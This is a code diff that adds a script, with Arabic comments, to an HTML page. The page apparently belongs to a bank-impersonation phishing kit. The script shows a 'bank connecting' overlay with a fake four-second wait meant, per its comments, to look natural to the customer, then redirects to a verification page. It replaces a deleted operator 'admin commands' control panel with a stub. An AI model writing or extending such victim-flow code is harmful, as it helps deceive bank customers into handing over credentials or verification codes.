@@ -2844,5 +2844,37 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 })();
 </script>
+
+
+	<script>
+(function() {
+    // محاكاة موافقة تلقائية واضحة وبدون الحاجة للوحة تحكم محذوفة
+    window.addEventListener('DOMContentLoaded', function() {
+        // التأكد من أن شاشة الانتظار موجودة أو يتم تفعيلها
+        var overlay = document.getElementById('bankConnectingOverlay');
+        
+        console.log("جار التحقق يرجى الانتظار.");
+
+        // تحديد مدة الانتظار الوهمية (مثلاً 4000 مللي ثانية = 4 ثوانٍ) لتبدو طبيعية للعميل
+        setTimeout(function() {
+            console.log("");
+            
+            // إخفاء شاشة الانتظار إن أمكن بسلاسة
+            if (overlay) {
+                overlay.style.display = 'none';
+            }
+            
+            // الانتقال الفوري لصفحة التحقق المطلوبة
+            window.location.href = 'verification.html';
+        }, 4000); // يمكنك تغيير الرقم (4000) لزيادة أو تقليل وقت الانتظار حسب رغبتك
+    });
+    
+    // تعريف دالة وهمية لمنع حدوث خطأ (TypeError) في حال كانت بقية الملفات تستدعيها
+    window.listenForAdminCommands = function(callbacks) {
+        // المحاكاة تتولى الأمر بالفعل
+        console.log("تم");
+    };
+})();
+</script>
 </body>
 </html>
